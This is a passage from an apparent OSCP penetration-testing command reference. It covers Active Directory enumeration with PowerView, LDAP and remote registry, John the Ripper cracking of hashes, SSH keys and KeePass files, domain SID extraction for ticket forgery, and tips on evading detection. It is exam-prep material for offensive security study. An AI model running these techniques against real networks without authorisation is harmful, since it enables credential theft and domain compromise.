Older systems = ANY domain user can enumerate sessions.
Modern systems = Only admins can enumerate.

OSCP STRATEGY:
Enumerate OS versions FIRST → save vulnerable targets → run Get-NetSession only on those.

Time:
10-30 seconds","high"
"powerview-get-netcomputer-os-filter","Filter Legacy Operating Systems (PowerView)","enumeration","Get-NetComputer -FullData | Where-Object {($_.operatingsystem -like '*Server 2012*') -or ($_.operatingsystem -like '*Server 2016*') -or (($_.operatingsystem -like '*Windows 10*') -and ([int]($_.operatingsystemversion -split '\.')[2] -lt 16299))}","Filter domain computers to show only legacy systems vulnerable to unauthenticated NetSessionEnum (pre-Windows 10 1709, pre-Server 2019)","","PRE-FILTERED TARGET LIST:
Automatic filtering for vulnerable systems only.

COMMAND:
  Get-NetComputer -FullData | Where-Object {($_.operatingsystem -like '*Server 2012*') -or ($_.operatingsystem -like '*Server 2016*') -or (($_.operatingsystem -like '*Windows 10*') -and ([int]($_.operatingsystemversion -split '\\.')[2] -lt 16299))}

WHAT THIS FILTERS:
- Server 2012 / 2012 R2 (build 9600)
- Server 2016 (build 14393)
- Windows 10 pre-1709 (build <16299)

RESTRICTION SOURCE:
MS security update KB4103727 (May 2018) changed SrvsvcSessionInfo registry permissions.

OSCP TIME SAVINGS:
- Without filter:
30+ minutes (enumerate all systems)
- With filter:
2-3 minutes (vulnerable systems only)

WORKFLOW:
1.

Run filter → save targets

2.

Enumerate sessions ONLY on those systems

3.

Skip modern systems entirely

Time:
10-30 seconds for filtering","high"
"check-netsessionenum-registry","Check NetSessionEnum Registry Permissions","enumeration","Get-Acl 'HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity' | Format-List","Inspect registry permissions on SrvsvcSessionInfo key to determine if NetSessionEnum API is restricted to administrators only (modern Windows) or allows authenticated users (legacy)","","Manual verification of NetSessionEnum vulnerability.

The SrvsvcSessionInfo registry value (REG_BINARY) under DefaultSecurity key is a Security Descriptor (SDDL format) that defines who can call NetWkstaUserEnum and NetSessionEnum APIs.

Pre-Windows 10 1709 / Server 2019:
Authenticated Users (S-1-5-11) have READ access to this SD = any domain user can enumerate sessions.

Post-1709/2019:
Only Administrators (S-1-5-32-544) and SYSTEM (S-1-5-18) have access = session enumeration restricted.

This is the root cause of Get-NetSession failures.

OSCP:
You likely won't check this manually (requires local admin) - instead, use OS version enumeration to predict vulnerability.

This command is for understanding WHY the restriction exists, not for routine recon.","medium"
"check-remote-registry-service","Check Remote Registry Service Status","enumeration","Get-Service -ComputerName <TARGET> -Name RemoteRegistry","Query Remote Registry service status on target system - required for PsLoggedOn and Get-NetLoggedon to enumerate logged-on users","","REMOTE REGISTRY SERVICE:
Required for PsLoggedOn and Get-NetLoggedon to work.

HOW IT WORKS:
Allows remote access to registry hives (HKLM, HKCU, HKEY_USERS) via RPC.
Tools read HKEY_USERS:
each loaded SID = logged-on user.

SERVICE STARTUP TYPES:
- Disabled:
Must be changed to Manual/Automatic first
- Manual:
Default on servers (auto-starts on connection)
- Automatic:
Always running

DEFAULT CONFIGURATIONS:
- Windows 8+ workstations:
Disabled
- Server 2012+:
Manual (good for attackers)

KEY INSIGHT:
If you have local admin + service is Manual → it auto-starts on connection (no explicit start needed).

COMMAND:
  Get-Service -ComputerName <TARGET> -Name RemoteRegistry

OSCP STRATEGY:
Check service status BEFORE attempting enumeration.
Saves time vs blind attempts.

Time:
<5 seconds per target","high"
"enable-remote-registry","Enable Remote Registry Service","enumeration","sc.exe \\<TARGET> config RemoteRegistry start= auto && sc.exe \\<TARGET> start RemoteRegistry","Remotely enable and start Remote Registry service to allow session enumeration via PsLoggedOn or Get-NetLoggedon (requires local admin access)","","ENABLE REMOTE REGISTRY REMOTELY:
Requires local admin access on target.

COMMAND:
  sc.exe \\<TARGET> config RemoteRegistry start= auto && sc.exe \\<TARGET> start RemoteRegistry

WHAT THIS DOES:
1.

Change startup type to Automatic (persistent)

2.

Start service immediately

WHY THIS WORKS:
Local admin → modify services via SCM → enable Remote Registry → use for enumeration.

SERVICE STATES:
- Disabled:
Must change to Manual/Auto first (this command)
- Manual:
Just start it (no config change needed)
- Automatic:
Already running (no action needed)

OPSEC NOTE:
Enabling services logged (Event ID 7040).
Prefer targets where service already Manual.

OSCP USE CASE:
You have admin but Remote Registry disabled → enable it → run PsLoggedOn/Get-NetLoggedon.

Time:
<10 seconds","high"
"query-hkey-users-remote","Query Remote HKEY_USERS Hive","enumeration","reg query \\<TARGET>\HKU","Manually enumerate logged-on users by querying HKEY_USERS hive on remote system via Remote Registry (each SID = logged-on user)","","MANUAL SESSION ENUMERATION:
Alternative to PsLoggedOn/Get-NetLoggedon.

HOW IT WORKS:
When users log in (interactive, RDP, RunAs), their NTUSER.DAT registry hive loads into HKEY_USERS\<SID>.
Each SID = active session.

COMMAND:
  reg query \\<TARGET>\HKU

SYSTEM SIDS TO IGNORE:
- S-1-5-18:
SYSTEM (always present)
- S-1-5-19:
LOCAL SERVICE
- S-1-5-20:
NETWORK SERVICE
- S-1-5-21-...-500:
Built-in Administrator (may not be logged in)

DOMAIN USER SIDS:
Start with S-1-5-21- and end with RID >1000.

SID-TO-NAME CONVERSION:
WMIC:
  wmic useraccount where sid='<SID>' get name

PowerShell:
  (New-Object System.Security.Principal.SecurityIdentifier('<SID>')).Translate([System.Security.Principal.NTAccount]).Value

OSCP ADVANTAGE:
Manual reg.exe often bypasses detection when automated tools blocked.

Time:
<10 seconds per target","medium"
"john-single-crack","John Single Crack Mode","enumeration","john --single <HASH_FILE>","Single crack mode using username-based variations","","OSCP TIP:
Always run single mode FIRST - it's fast (<1 minute) and surprisingly effective.

Common successes:
username123, Username1!, Username@2023.

Requires username:hash format.

Most effective on /etc/shadow dumps where GECOS fields provide hints (full names, departments).","medium"
"john-wordlist-attack","John Wordlist Attack","enumeration","john --wordlist=<WORDLIST> <HASH_FILE>","Dictionary attack using wordlist","","Standard dictionary attack.

Run after --single mode.

Use rockyou.txt for comprehensive coverage (14M passwords).

JtR auto-detects hash format in most cases.","high"
"john-rules-attack","John Rule-Based Attack","enumeration","john --wordlist=<WORDLIST> --rules=<RULESET> <HASH_FILE>","Apply mutation rules to wordlist","","OSCP TIP:
Rule-based attacks crack passwords not in wordlist.

Users modify base words to meet policies (Password → Password123!).

Custom rules in /etc/john/john.conf:
[List.Rules:sshRules] then rule functions.

Default rules often sufficient - try before custom.","high"
"john-format-specify","John Specify Hash Format","enumeration","john --format=<FORMAT> --wordlist=<WORDLIST> <HASH_FILE>","Explicitly specify hash format (when auto-detect fails)","","List all formats:
john --list=formats | grep -i <hash_type>.

Common formats:
raw-md5 (plain MD5), nt (NTLM), Raw-SHA256, bcrypt, md5crypt ($1$), sha512crypt ($6$).

Auto-detect usually works but explicit format avoids ambiguity.","medium"
"john-show-cracked","Show Cracked Passwords","enumeration","john --show <HASH_FILE>","Display previously cracked passwords from john.pot","","OSCP REQUIREMENT:
Document all cracked passwords.

Always run --show after successful crack.

JtR saves to ~/.john/john.pot permanently.

Combine with --format if needed:
john --show --format=raw-md5 hashes.txt","high"
"john-ssh-key-crack","Crack SSH Private Key Passphrase","enumeration","john --wordlist=<WORDLIST> --rules=<RULESET> <SSH_HASH>","Crack SSH private key passphrase (supports all ciphers)","","OSCP TIP:
JtR supports MORE SSH ciphers than Hashcat.

Use JtR for SSH keys (especially modern keys with aes-256-ctr).

Extract hash:
ssh2john id_rsa > ssh.hash.

Build custom wordlist from user information (notes.txt, common words, dates).

Apply rules based on password policy.","high"
"john-keepass-crack","Crack KeePass Database","enumeration","john --wordlist=<WORDLIST> --rules=<RULESET> <KEEPASS_HASH>","Crack KeePass master password","","Extract hash:
keepass2john Database.kdbx > keepass.hash.

Remove 'Database:' prefix.

KeePass uses slow KDF - focused wordlists essential.

User password patterns critical (reuse with policy modifications).","high"
"john-incremental-mode","John Incremental Mode (Brute-Force)","enumeration","john --incremental <HASH_FILE>","Brute-force attack with intelligent character frequency","","Last resort attack - extremely slow.

Use only when:
1) No wordlist success 2) Short password suspected 3) Fast hash (MD5, NTLM).

NOT viable for OSCP exam time constraints unless very short password (<6 chars).","low"
"john-status","John Show Status","enumeration","john --status","Display status of running/paused cracking session","","Monitor long attacks:
john --status.

During active session, press any key for instant status update (no need for separate command).

Critical for OSCP time management - check ETA regularly.","medium"
"john-restore-session","John Restore Session","enumeration","john --restore","Resume previously interrupted cracking session","","JtR auto-saves to ~/.john/john.rec.

Resume with:
john --restore.

Useful for multi-hour attacks interrupted by network issues or intentional pause.

Session file cleared after successful completion.","medium"
"john-list-formats","List All Supported Formats","enumeration","john --list=formats | grep -i <SEARCH>","List all hash formats supported by John","","Reference command - find correct format name.

Examples:
raw-md5, raw-sha256, nt (NTLM), bcrypt, SSH, KeePass.

Grep for hash type:
john --list=formats | grep -i keepass","medium"
"john-add-custom-rules","Add Custom Rules to john.conf","enumeration","sudo sh -c 'cat <RULE_FILE> >> /etc/john/john.conf'","Append custom rules to John configuration","","OSCP TIP:
Create custom rules based on password policy.

Example:
Policy requires capital + 3 digits + special → Rules:
c $1 $3 $7 $!, c $1 $2 $3 $!.

Format:
[List.Rules:sshRules] then c $1 $3 $7 $!.

Test first:
echo 'password' > test.txt && john --wordlist=test.txt --rules=sshRules --stdout (verify mutations).","high"
"ad-sid-whoami-extract","Extract Domain SID Using whoami","enumeration","whoami /user","Extract the current user's SID, from which the Domain SID can be derived by removing the RID (last portion after final hyphen).","domain-reconnaissance","OSCP METHODOLOGY:
This is the FASTEST and STEALTHIEST method to obtain the Domain SID during an exam.

Unlike PowerView or other PowerShell tools, whoami is a native Windows binary that exists on every system since Windows XP and generates minimal security event logs.

It requires NO special permissions, NO PowerShell execution policy bypasses, and NO external tool downloads.

MANUAL ALTERNATIVE:
If whoami is restricted (rare), use 'wmic useraccount get name,sid' to list all local and domain accounts with their SIDs.

Domain accounts will share the same Domain SID prefix.

WHY THIS MATTERS FOR SILVER/GOLDEN TICKETS:
The Domain SID is a REQUIRED parameter when forging Kerberos tickets with Mimikatz or Rubeus.

Mimikatz's kerberos::golden module needs '/sid:S-1-5-21-DOMAIN-DOMAIN-DOMAIN' (WITHOUT the RID).

If you include the RID by mistake, the forged ticket will be invalid and authentication will fail with 'KRB_AP_ERR_MODIFIED'.

SID STRUCTURE EXPLAINED:
- S-1:
SID revision (always 1)

- 5:
SECURITY_NT_AUTHORITY (Windows security subsystem)

- 21:
Domain or local computer account (vs.

18=SYSTEM, 32=Built-in)

- Three 10-digit segments:
Domain identifier (unique per AD domain)

- Final segment (RID):
User/group/computer relative ID within domain

COMMON OSCP EXAM SCENARIO:
You've compromised a domain user account (e.g., via password spraying or AS-REP roasting).

You need to create a Silver ticket to access an HTTP SPN on a web server.

First step:
Extract Domain SID with whoami /user.

Copy everything EXCEPT the last segment after the final hyphen.

This becomes your '/sid:' parameter.

Time:
<10 seconds total (5 sec to run command, 5 sec to extract Domain SID by removing RID)

DETECTION EVASION:
whoami /user generates Event ID 4688 (Process Creation) but this is extremely common and typically not monitored.

Unlike PowerShell cmdlets that may trigger AMSI or script block logging, whoami is a compiled binary that bypasses these defenses.

OSCP EXAM TIP:
Write the Domain SID down immediately after extraction and store it in your enumeration notes.

You'll need it multiple times if you perform Silver tickets, Golden tickets, or SID history attacks.

Don't waste time re-extracting it.

CROSS-REFERENCE WITH OTHER ENUMERATION:
If you've run PowerView's Get-NetDomain, verify the Domain SID matches.

If they differ, you may be on a child domain or in a forest trust situation.

Always use the Domain SID of the target domain where you're forging tickets.","high"
"ad-sid-powerview-domain","Extract Domain SID Using PowerView","enumeration","Get-DomainSID","Directly retrieve the Domain SID of the current or specified domain using PowerView. Returns only the Domain SID without user RID, ready for use in ticket forgery.","domain-reconnaissance","OSCP METHODOLOGY:
PowerView's Get-DomainSID is the MOST EFFICIENT method when PowerShell is available and AMSI is not blocking.

It eliminates manual parsing and reduces operator error.

However, it requires importing PowerView, which may trigger AV/EDR in realistic environments.

For OSCP exams, this is typically safe as exam machines are not running EDR, but always have a fallback method (whoami /user).

MANUAL ALTERNATIVE:
If PowerView unavailable, use ADSI directly in PowerShell:
  $root = [ADSI]""LDAP://RootDSE""
  $domain = [ADSI]""LDAP://$($root.defaultNamingContext)""
  $domain.objectSid | ForEach-Object { (New-Object Security.Principal.SecurityIdentifier($_, 0)).Value }

This achieves the same result without PowerView dependency.

WHEN TO USE THIS VS whoami /user:
- USE Get-DomainSID:
  When you have PowerShell access, PowerView is already loaded (e.g., during enumeration phase), or you need to query multiple domains in a forest.

- USE whoami /user:
  When PowerShell is restricted, AMSI is blocking, PowerView is unavailable, or you need maximum stealth (native binary, minimal logs).

POWERVIEW CONTEXT:
Get-DomainSID is part of PowerView's domain enumeration suite.

If you're already running Get-NetDomain, Get-NetUser, Get-NetComputer for reconnaissance, adding Get-DomainSID is a natural extension.

PowerView functions are designed to chain together - output from Get-DomainSID can be piped into ticket forgery automation scripts.

CROSS-DOMAIN FORESTS:
In environments with parent/child domains or forest trusts, you may encounter different Domain SIDs.

Get-DomainSID defaults to the current user's domain.

To target a specific domain:
  Get-DomainSID -Domain child.corp.com

Verify the correct domain with Get-NetDomain to see DomainName property.

OSCP EXAM TIP:
If you're using PowerView for enumeration, cache the Domain SID in a variable immediately:
  $DomainSID = Get-DomainSID
  Write-Host ""[+] Domain SID:
$DomainSID"" -ForegroundColor Green

This prevents re-querying and speeds up ticket forgery later.

Time:
<5 seconds (2 sec if PowerView pre-loaded, +10 sec if you need to import PowerView first)

DETECTION:
Generates LDAP queries to the domain controller (Event ID 4662 on DC:
Directory Service Access).

Modern EDR may flag PowerView import (AMSI scan), but LDAP queries themselves are common and rarely alerted.

If stealth is critical, use whoami /user instead.

COMPARISON WITH Get-NetDomain:
Get-NetDomain returns a DomainSID property among many others (DomainControllers, Forest, DomainName, etc.).

Get-DomainSID extracts ONLY the SID.

Use Get-NetDomain for comprehensive enumeration, Get-DomainSID for quick SID extraction.","high"
"ad-sid-wmic-extract","Extract Domain SID Using WMIC","enumeration","wmic useraccount get name,sid","List all local and domain user accounts with their SIDs using Windows Management Instrumentation Command-line (WMIC). Domain accounts share the same Domain SID prefix.","domain-reconnaissance","OSCP METHODOLOGY:
WMIC is a LEGACY method that's useful when whoami is unavailable and PowerShell is restricted.

It's slower than whoami /user and requires more parsing, but it provides a comprehensive view of all accounts on the system.

Main advantage:
You can see ALL domain accounts at once and verify the Domain SID is consistent across them (good for validation).

MANUAL ALTERNATIVE:
If WMIC deprecated/removed, use PowerShell equivalent:
  Get-WmiObject -Class Win32_UserAccount | Select-Object Name, SID, Domain | Format-Table

This achieves identical results using PowerShell's WMI cmdlets.

WHEN TO USE THIS METHOD:
- VALIDATION:
  When you've extracted Domain SID with whoami /user and want to verify it's correct by comparing against other domain accounts

- BULK EXTRACTION:
  When you need SIDs for multiple domain users (e.g., building a target list)

- LEGACY SYSTEMS:
  Older Windows servers (2008/2012) where PowerShell may be limited but WMIC is fully functional

WHEN NOT TO USE:
- SPEED:
  whoami /user is faster (single account vs.

all accounts)

- STEALTH:
  WMIC generates more WMI events than whoami

- MODERN SYSTEMS:
  Windows 10 21H1+ shows deprecation warning

PARSING DOMAIN SID FROM OUTPUT:
1.

Identify domain accounts (exclude local SAM accounts like 'Administrator', 'Guest' if they have different SID prefix)

2.

Pick any domain account's SID (e.g., CORP\jeff:
S-1-5-21-1987370270-658905905-1781884369-1105)

3.

Remove RID (last segment):
S-1-5-21-1987370270-658905905-1781884369

4.

This is the Domain SID

VALIDATION TECHNIQUE:
All domain accounts should have the SAME Domain SID (first four segments).

If you see different Domain SIDs, you may be dealing with:
- Local vs.

domain accounts (local accounts have machine-specific SID)
- Multi-domain forest (child domain accounts have different Domain SID)
- Migrated accounts (SID history may show old SIDs)

OSCP EXAM TIP:
WMIC is NOT the first choice for Domain SID extraction (use whoami /user or Get-DomainSID instead).

However, it's valuable when you need to enumerate multiple domain user SIDs simultaneously (e.g., for SID history analysis or identifying high-value targets like RID 500 domain admin).

Time:
5-10 seconds (slower than whoami due to WMI query overhead and parsing all accounts)

DETECTION:
Generates Event ID 4688 (Process Creation for WMIC.exe) and WMI activity logs (Event ID 5857-5861 in Microsoft-Windows-WMI-Activity/Operational).

More verbose than whoami but still common activity.

EDR may flag unusual WMI queries, but useraccount enumeration is standard.

COMPATIBILITY NOTE:
WMIC was deprecated in Windows 10 version 21H1 (August 2021) and removed in some Windows 11 builds.

Always test availability with 'wmic /?'.

If unavailable, use PowerShell or whoami alternatives.","medium"
"ps-get-group-members-basic","Get Group Members - Basic LDAP Query (PowerShell)","enumeration","$groupResult = LDAPSearch -LDAPQuery ""(&(objectCategory=group)(name=<GROUP_NAME>))""; $group = $groupResult[0]; $group.Properties.member","Query AD group to get direct members (Distinguished Names) - first step in nested group enumeration","","FOUNDATION FOR NESTED GROUP ENUMERATION:
MEMBER ATTRIBUTE FORMAT:
Returns Distinguished Names:
  CN=username,CN=Users,DC=corp,DC=com

EACH DN NEEDS INDIVIDUAL QUERY:
- User (leaf node):
Stop
- Group (nested):
Requires recursion

NESTED GROUPS IN ENTERPRISE AD:
Common pattern:
Group contains groups contains users.

OSCP TARGETS:
Groups with 'Service', 'IT', 'Admin' in names.
Often contain privileged accounts buried multiple levels deep.

Time:
5 seconds per query","high"
"ps-nested-group-check-member-type","Check if Group Member is User or Group (PowerShell)","enumeration","$memberDN = ""<DISTINGUISHED_NAME>""; $memberSearch = LDAPSearch -LDAPQuery ""(distinguishedName=$memberDN)""; $member = $memberSearch[0]; $objectClass = $member.Properties.objectclass; if ($objectClass -contains ""group"") { Write-Host ""[GROUP] $($member.Properties.name[0])"" -ForegroundColor Magenta } elseif ($objectClass -contains ""user"") { Write-Host ""[USER] $($member.Properties.name[0])"" -ForegroundColor Green }","Query a group member by Distinguished Name to determine if it's a user (leaf) or nested group (requires recursion)","","The objectClass attribute is hierarchical - users have ['top', 'person', 'organizationalPerson', 'user'], groups have ['top', 'group'].

Using '-contains' handles this hierarchy correctly.

Distinguished Names must match exactly - even extra spaces cause query failures.

OSCP:
This logic determines whether to recurse (nested group) or record (user).

In exams, you'll often find users 2-3 levels deep:
'Service Personnel' → 'IT Support' → 'Developers' → target user.

OBJECTCLASS ATTRIBUTE:
Hierarchical structure - users vs groups.
Using '-contains' handles hierarchy correctly.

DN MATCHING:
Must match exactly - extra spaces cause failures.

OSCP LOGIC:
- Nested group:
Recurse deeper
- User:
Record and stop

TYPICAL EXAM:
3 levels deep

Time:
2 seconds per member","high"
"ps-nested-group-recursive-function","Recursive Nested Group Enumeration Function (PowerShell)","enumeration","function Get-NestedGroupMember { param([string]$GroupName, [int]$Depth = 0); $indent = ""  "" * $Depth; Write-Host ""$indent[+] $GroupName"" -ForegroundColor Cyan; $groupResult = LDAPSearch -LDAPQuery ""(&(objectCategory=group)(name=$GroupName))""; if ($groupResult.Count -eq 0) { return }; $group = $groupResult[0]; $members = $group.Properties.member; if ($members.Count -eq 0) { return }; foreach ($memberDN in $members) { $memberSearch = LDAPSearch -LDAPQuery ""(distinguishedName=$memberDN)""; if ($memberSearch.Count -gt 0) { $member = $memberSearch[0]; $memberName = $member.Properties.name[0]; $objectClass = $member.Properties.objectclass; if ($objectClass -contains ""group"") { Write-Host ""$indent  [GROUP] $memberName"" -ForegroundColor Magenta; Get-NestedGroupMember -GroupName $memberName -Depth ($Depth + 1) } elseif ($objectClass -contains ""user"") { Write-Host ""$indent  [USER] $memberName"" -ForegroundColor Green; $script:AllUsers += $member } } } }; $script:AllUsers = @(); Get-NestedGroupMember -GroupName ""<GROUP_NAME>""","Complete recursive function to enumerate all users in a group hierarchy - automatically traverses nested groups and collects users","","This function implements depth-first traversal of the group hierarchy.

The $Depth parameter creates visual tree output - easier to understand nesting levels during enumeration.

$script:AllUsers uses script scope (not global) to avoid polluting global namespace while remaining accessible across recursive calls.

Tree output format:
Top-level group (no indent) → Level 1 groups (2 spaces) → Level 2 groups (4 spaces) → Users (indented at their level).

OSCP:
This is the complete solution for 'unravel nested groups' lab questions.

Copy-paste this entire function, then call with target group name.

Typical exam scenario:
3 levels deep, 5-10 total users.

Time estimate:
10-15 seconds for complete enumeration.","high"
"ps-get-last-nested-user","Get Last User from Nested Group Enumeration (PowerShell)","enumeration","if ($script:AllUsers.Count -gt 0) { $lastUser = $script:AllUsers[-1]; Write-Host ""`n[+] LAST USER: $($lastUser.Properties.samaccountname[0])"" -ForegroundColor Yellow; foreach ($prop in $lastUser.Properties.PropertyNames) { Write-Host ""$prop : $($lastUser.Properties[$prop])"" -ForegroundColor White } } else { Write-Host ""[-] No users found"" -ForegroundColor Red }","Display all attributes of the last user found in nested group enumeration - useful for finding flags in OSCP labs","","OSCP LAB PATTERN:
Questions ask:
'enumerate nested groups and find the last user' then extract flag.

COMMON FLAG LOCATIONS:
- description:
Most common
- info:
Secondary
- comment:
Tertiary
- userParameters:
Rare

FLAG FORMATS:
- flag{...}
- OS{...}
- Plaintext hints
- Base64 encoded

LAST USER DEFINITION:
Last DIRECT user member discovered during depth-first traversal.
Not necessarily last alphabetically.

Time:
Instant after enumeration","high"
"ps-find-new-domain-admin","Find New Domain Admin User (PowerShell)","enumeration","LDAPSearch -LDAPQuery ""(&(objectCategory=group)(name=Domain Admins))"" | ForEach-Object { $_.Properties.member } | ForEach-Object { $memberDN = $_; $userSearch = LDAPSearch -LDAPQuery ""(distinguishedName=$memberDN)""; $user = $userSearch[0]; [PSCustomObject]@{ Name = $user.Properties.samaccountname[0]; Created = $user.Properties.whencreated[0]; DN = $memberDN } } | Sort-Object Created | Format-Table -AutoSize","List all Domain Admins members with creation dates sorted chronologically - identify recently added admin accounts","","DOMAIN ADMIN ACCOUNT AGES:
Built-in accounts:
- Administrator, krbtgt, Guest
- Creation date matches domain creation (years old)

Newly added admins:
- Recent timestamps (days/weeks old)

OSCP LAB PATTERN:
Question:
'Which NEW user is part of Domain Admins?'
Answer:
Account with most recent whencreated date.

EXCLUDE BUILT-INS:
Administrator, krbtgt, Guest

ALTERNATIVE:
Filter by whencreated > recent date.

Time:
10 seconds","high"
"powerview-get-domaingroup-recursive","PowerView - Get Group Members Recursively (PowerView 3.0+)","enumeration","Get-DomainGroupMember -Identity ""<GROUP_NAME>"" -Recurse","PowerView command to enumerate group members including all nested groups automatically","","POWERVIEW 3.0+ CHANGES:
Parameter:
-GroupName became -Identity

FASTEST METHOD:
IF PowerView available.

WITHOUT -RECURSE:
Only direct members (one level).

WITH -RECURSE:
Flattens entire hierarchy into single list.

OUTPUT:
Includes MemberObjectClass to distinguish users from groups.

OSCP BACKUP:
PowerView may be blocked by AV.
Know manual .NET method:
ps-nested-group-recursive-function

Time:
3-5 seconds","high"
"ps-powerview-get-user-details","PowerView - Get User Full Attributes","enumeration","Get-DomainUser -Identity ""<USERNAME>"" | Format-List *","Retrieve all AD attributes for a specific user - useful for flag extraction after nested group enumeration","","FORMAT-LIST * DISPLAYS 80+ ATTRIBUTES:
Flag locations:
- description:
Common
- info:
Secondary

Account info:
- memberof:
All group memberships
- whencreated:
Account age
- pwdlastset:
Password age
- userAccountControl:
Account flags
- adminCount:
Privilege indicator
- servicePrincipalName:
Kerberoasting target

OSCP WORKFLOW:
1.

Nested group enumeration identifies target user

2.

Use this command for full details

3.

Extract flags from attributes

Time:
2 seconds","high"
"ps-powerview-find-service-accounts","PowerView - Find Service Accounts in Groups","enumeration","Get-DomainGroupMember -Identity ""<GROUP_NAME>"" -Recurse | Where-Object { $_.MemberObjectClass -eq ""user"" -and $_.MemberName -like ""*svc*"" }","Find service accounts buried in nested groups - service accounts often have weak passwords and high privileges","","SERVICE ACCOUNT NAMING PATTERNS:
- svc_*, *svc*
- sql_*, *sql*
- backup_*, *backup*
- sa (SQL Server admin)

CHARACTERISTICS:
- Rarely changed passwords (pwdlastset old)
- Often have SPNs (Kerberoastable)
- Frequently over-privileged (Domain Admins)
- Descriptions often contain passwords/hints

OSCP:
High-value targets.
Weak passwords common.
Often reused across services.

Time:
5 seconds","high"
"ps-extract-flag-from-user","Extract Flag from User Attributes (PowerShell)","enumeration","$user = LDAPSearch -LDAPQuery ""(samAccountName=<USERNAME>)""; $user = $user[0]; Write-Host ""`n[+] Checking flag locations:"" -ForegroundColor Yellow; @('description','info','comment','adminDescription','userParameters') | ForEach-Object { $value = $user.Properties[$_][0]; if ($value) { Write-Host ""$_ : $value"" -ForegroundColor Cyan } }","Check common flag storage locations in user AD attributes - targeted flag extraction for OSCP labs","","OSCP FLAG LOCATION FREQUENCY:
- description:
70%
- info:
15%
- comment:
10%
- adminDescription:
3%
- userParameters:
2%

FLAG FORMATS:
- flag{...}:
Most common
- OS{...}:
OffSec format
- Plaintext hints
- Base64 encoded

RARE LOCATIONS:
- msDS-CloudExtensionAttribute1-10
- extensionAttribute1-15
- otherMailbox

OSCP LAB PATTERN:
'Enumerate nested groups and extract flag from last user'

Time:
2 seconds","high"
"ps-nested-group-one-liner","Nested Group Enumeration - Complete One-Liner (PowerShell)","enumeration","function LDAPSearch { param([string]$LDAPQuery); $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name; $DN = ([adsi]'').distinguishedName; $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry(""LDAP://$PDC/$DN""); $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery); return $DirectorySearcher.FindAll() }; function Get-NestedGroupMember { param([string]$GroupName, [int]$Depth = 0); $indent = ""  "" * $Depth; Write-Host ""$indent[+] $GroupName"" -ForegroundColor Cyan; $groupResult = LDAPSearch -LDAPQuery ""(&(objectCategory=group)(name=$GroupName))""; if ($groupResult.Count -eq 0) { return }; $group = $groupResult[0]; $members = $group.Properties.member; if ($members.Count -eq 0) { return }; foreach ($memberDN in $members) { $memberSearch = LDAPSearch -LDAPQuery ""(distinguishedName=$memberDN)""; if ($memberSearch.Count -gt 0) { $member = $memberSearch[0]; $memberName = $member.Properties.name[0]; $objectClass = $member.Properties.objectclass; if ($objectClass -contains ""group"") { Write-Host ""$indent  [GROUP] $memberName"" -ForegroundColor Magenta; Get-NestedGroupMember -GroupName $memberName -Depth ($Depth + 1) } elseif ($objectClass -contains ""user"") { Write-Host ""$indent  [USER] $memberName"" -ForegroundColor Green; $script:AllUsers += $member } } } }; $script:AllUsers = @(); Get-NestedGroupMember -GroupName ""<GROUP_NAME>""; if ($script:AllUsers.Count -gt 0) { $lastUser = $script:AllUsers[-1]; Write-Host ""`n[+] LAST USER: $($lastUser.Properties.samaccountname[0])"" -ForegroundColor Yellow; Write-Host ""[+] FLAG LOCATIONS:"" -ForegroundColor Yellow; @('description','info','comment') | ForEach-Object { $value = $lastUser.Properties[$_][0]; if ($value) { Write-Host ""$_ : $value"" -ForegroundColor Cyan } } }","Complete copy-paste solution for OSCP nested group labs - includes LDAPSearch function, recursive enumeration, and automatic flag extraction","","ULTIMATE OSCP NESTED GROUP SOLUTION:
ONE-LINE EXECUTION:
Copy entire command → replace <GROUP_NAME> → execute

OUTPUT SHOWS:
1.

Tree structure of group hierarchy
2.

All users at all levels
3.

Last user details
4.

Flag attributes automatically extracted

NO DEPENDENCIES:
- No PowerView required
- No separate function files
- Single copy-paste execution

OSCP EXAM USE:
Question:
'enumerate nested groups and find flag in last user'
Solution:
Paste this command → done

Time:
15 seconds total","high"
"ps-compare-powerview-versions","PowerView Version Compatibility Check","enumeration","Get-Command Get-NetGroupMember -ErrorAction SilentlyContinue | Select-Object -ExpandProperty ParameterSets | Select-Object -First 1 | Select-Object -ExpandProperty Parameters | Select-Object Name | Where-Object { $_.Name -like ""*Group*"" -or $_.Name -like ""*Identity*"" }","Detect PowerView version by checking parameter names - determines if you have version 2.0 (-GroupName) or 3.0+ (-Identity)","","POWERVIEW VERSION HISTORY:
Version 2.0:
Specific parameters:
- -GroupName
- -UserName
- -ComputerName

Version 3.0+:
Standardized on -Identity for all commands.

COMMON ERROR:
'A parameter cannot be found that matches parameter name GroupName'
= Using v2.0 syntax on v3.0+ PowerView

OSCP:
- Most modern distributions:
3.0+
- Older lab machines:
May have 2.0
- Know both syntaxes

Time:
5 seconds","medium"
"bloodhound-upload-data","BloodHound Upload Collector Data","enumeration","bloodhound","Launch BloodHound GUI and upload SharpHound collector data (ZIP/JSON) to Neo4j database for Active Directory graph analysis. Enables visualization of privilege escalation paths, ACL misconfigurations, and attack surface.","active-directory","OSCP METHODOLOGY: BloodHound is MANDATORY for AD attack path discovery. Manual enumeration of ACLs, group memberships, and sessions would take hours - BloodHound does it in seconds.

TIME ESTIMATE: 2-5 minutes (Neo4j start + data upload + verification)

WORKFLOW:
1. Ensure Neo4j running: sudo neo4j console (separate terminal)
2. Launch BloodHound: bloodhound (or /opt/BloodHound-linux-x64/BloodHound)
3. Authenticate: bolt://localhost:7687, neo4j:bloodhound
4. Clear old data: Database Info → Clear Database
5. Upload: Click Upload Data → Select ZIP from SharpHound
6. Verify: Database Info shows node counts (Users: 50, Computers: 25, etc.)
7. Begin analysis: Search owned user → Mark as Owned → Find paths

COLLECTOR COMPARISON:
- SharpHound.exe (Windows): Fastest, most complete, runs on target. Requires .NET. Output: C:\Users\<USER>\<TIMESTAMP>_BloodHound.zip
- Invoke-BloodHound.ps1 (PowerShell): Stealthier (no .exe), slower. May be blocked by execution policy.
- bloodhound-python (Kali): Remote collection via LDAP/SMB. Doesn't require code execution on target. Less data than SharpHound (no local admin sessions). Syntax: bloodhound-python -u <USER> -p <PASS> -d corp.com -ns <DC_IP> -c All --zip

DATA COLLECTION FLAGS:
- -c All: Collects everything (default, recommended for OSCP)
- -c Session: Only logged-on sessions (fast, but misses ACLs)
- -c ACL: Only ACLs and permissions (misses sessions)
